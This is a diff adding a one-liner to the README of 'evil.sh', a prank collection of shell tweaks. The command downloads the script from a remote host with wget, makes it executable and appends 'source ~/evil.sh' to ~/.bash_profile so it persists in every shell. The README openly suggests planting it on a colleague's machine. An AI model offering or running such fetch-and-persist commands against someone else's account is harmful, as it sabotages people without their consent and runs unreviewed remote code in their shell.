@@ -1,5 +1,13 @@
 # `evil.sh` (aka. `devili.sh`)
 
+Oneliner
+
+```
+wget http://tools.apsl.net/evil.sh -O ~/evil.sh && \
+chmod +x ~/evil.sh && \
+echo "source ~/evil.sh" >> ~/.bash_profile
+```
+
 A collection of various subtle and not-so-subtle shell tweaks that will slowly drive people insane.
 
 Feel like trolling a colleague? Just add `source ~/evil.sh` to their `.bash_profile` and watch the chaos ensue.
